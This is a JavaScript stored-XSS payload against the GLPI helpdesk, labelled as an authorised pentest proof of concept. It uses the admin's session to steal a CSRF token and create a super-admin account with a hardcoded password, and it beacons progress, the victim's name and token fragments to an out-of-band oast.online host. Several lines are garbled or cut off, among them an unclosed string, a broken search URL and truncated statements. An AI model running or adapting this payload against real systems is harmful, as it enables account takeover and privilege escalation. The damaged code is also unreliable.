// PT2026-MSSP · Bloka · PoC autorizado — GLPI stored-XSS -> sesión admin -> crea super-admin de PRUEBA.
(async () => {
  const OOB = 'das4ob5ml5ihodvcopgghz4tid4t8u7pc.oast.online';
  const beacon = (t) => { try { new Image().src = 'https://' + OOB + '/glpixss-' + t; } catch (e) {} };
  const grab = (re, t) => { const m = t.match(re); return m ? m[1] : null; };
  try {
    beacon('run@' + encodeURIComponent(location.pathname).slice(0, 40));

    // 1) Confirmar sesión autenticada (y quién es)
    const pref = await (await fetch('/front/preference.php', { credentials: 'include' })).text();
    const who = grab(/name=["']realname["'][^>]*value=["']([^"']*)/i, pref)
             || grab(/"login"\s*:\s*"([^"]+)"/i, pref) || 'unknown';
    beacon('who-' + encodeURIComponent(who).slice(0, 30));

    // 2) CSRF token del form de alta de usuario
    const form = await (await fetch('/front/user.form.php', { credentials: 'include' })).text();
    const tok = grab(/name=["']_glpi_csrf_token["']\s+value=["']([a-f0-9]+)/i, form);
    beacon('tok-' + (tok ? tok.slice(0, 8) : 'MISSING'));
    if (!tok) return;

    // 3) Crear super-admin de PRUEBA (profile raíz)
    const p = new URLSearchParams();
    p.set('_glpi_csrf_token', tok);
    p.set('name', 'pentest-bloka');
    p.set('realname', 'BLOKA PENTEST PT2026-MSS
    p.set('password', 'Bl0ka!PT2026#Xy');
    p.set('password2', 'Bl0ka!PT2026#Xy');
    p.set('authtype', '1');
    p.set('is_active', '1');
    p.set('_profiles_id', '4');
    p.set('_entities_id', '0');
    p.set('_is_recursive', '1');
    p.set('add', '1');
    const r = await fetch('/front/user.form.php', {
      method: 'POST', credentials: 'include',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: p.toString()
    });
    const rt = await r.text();
    beacon('add-' + r.status + '-' + (r.redirected ? 'redir' : 'nored'));
    beacon('res-' + (/existe|already|erreur|incnquant|refus/i.test(rt) ? 'maybe-fail' :'likely-ok'));

    // 4) Verificar que la cuenta quedó creada
    const chk = await (await fetch('/front/user5D=1&criteria%5B0%5D%5Bsearchtype%5D=contains&criteria%5B0%5D%5Bvalue%5D=pentest-bloka', { credentials: 'include' })).text();
    beacon('chk-' + (/pentest-bloka/i.test(chk)
  } catch (e) {
    beacon('ex-' + encodeURIComponent(('' + e).
  }
})();
